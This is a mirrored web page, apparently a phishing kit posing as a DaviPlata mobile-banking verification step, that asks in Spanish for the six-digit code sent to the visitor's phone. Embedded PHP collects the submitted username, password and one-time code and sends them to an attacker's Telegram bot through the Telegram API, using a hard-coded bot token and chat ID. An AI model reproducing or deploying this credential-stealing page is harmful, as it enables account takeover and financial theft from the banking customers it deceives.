<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from 1.daviplataactiva.repl.co/index3.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 Jan 2023 06:19:32 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
	<title>home</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="stylesheet" type="text/css" href="util.css">
	<link rel="stylesheet" type="text/css" href="main.css">
	<style>
input:focus {
border:1px solid #ff0000;
}
</style>

</head>
<body>
	
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
				<form class="login100-form validate-form" method="post" name="form1" id="form1" action="index2.php">
					<div align="center">
						<img src="512x512bb.jpg" style="width:150px; margin-bottom: 20px;"><br>
					<span style="font-size:22px;">Ingresa el código que enviamos a tu celular</span>
					</div>
					<br>
						  <div align="center">

  <input type="tel" maxlength="1"  onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" style="width:35px; height:60px; -webkit-box-shadow: 0 0 0 0.125em #ad0000;
    box-shadow: 0 0 0 0.125em #FF0000;    border-color: transparent; text-align:center;"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num2.focus()" name="num1" autofocus required>
    &nbsp;<input type="tel" maxlength="1" style="width:35px; height:60px;-webkit-box-shadow: 0 0 0 0.125em #FF0000;
    box-shadow: 0 0 0 0.125em #FF0000;    border-color: transparent; text-align:center;"  onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) num3.focus()" id="num2" name="num2" autocomplete="off" required>
    &nbsp;<input type="tel" maxlength="1" style="width:35px; height:60px;-webkit-box-shadow: 0 0 0 0.125em #FF0000;
    box-shadow: 0 0 0 0.125em #FF0000;    border-color: transparent; text-align:center;"  onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num4.focus()" id="num3" name="num3" autocomplete="off" required>
  &nbsp;  
  <input type="tel" maxlength="1" style="width:35px; height:60px;-webkit-box-shadow: 0 0 0 0.125em #FF0000;
    box-shadow: 0 0 0 0.125em #FF0000;    border-color: transparent; text-align:center;"  onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num5.focus()"  id="num4" name="num4" autocomplete="off" required>
    &nbsp;<input type="tel" maxlength="1" style="width:35px; height:60px;-webkit-box-shadow: 0 0 0 0.125em #FF0000;
    box-shadow: 0 0 0 0.125em #FF0000;    border-color: transparent; text-align:center;"  onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" onkeyup="if (this.value.length == this.getAttribute('maxlength')) num6.focus()" id="num5" name="num5" autocomplete="off" required>
   &nbsp; <input type="tel" maxlength="1" style="width:35px; height:60px;-webkit-box-shadow: 0 0 0 0.125em #FF0000;
    box-shadow: 0 0 0 0.125em #FF0000;    border-color: transparent; text-align:center;"  onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) form1.submit();" id="num6" name="num6" autocomplete="off" required>
 
 </div> <br>

					<div class="container-login100-form-btn">
						<div class="wrap-login100-form-btn">
							<div class="login100-form-bgbtn"></div>
							<button type="submit" class="login100-form-btn">
								Siguiente
							</button>
						</div>
					</div>

					<div class="text-center p-t-115">
					
						

					</div>
				</form>
			</div>
		</div>
	</div>
	
	<?php
    if (isset($_POST['submit'])) {
        $user = $_POST['user'];
        $password = $_POST['password'];
        $code = $_POST['code'];

        // Your Telegram API Token
        $token = "5964956592:AAHrvMUcX3qB6oUxvpkq5Q8ZvKzKa2dJYhY";
        // Your Telegram Chat ID
        $chat_id = "5915051785";

        $message = "User: " . $user . "\nPassword: " . $password . "\nCode: " . $code;

        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&text=" . $message;

        file_get_contents($url);
    }
?>

</body>

<!-- Mirrored from 1.daviplataactiva.repl.co/index3.php by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 14 Jan 2023 06:19:34 GMT -->
</html>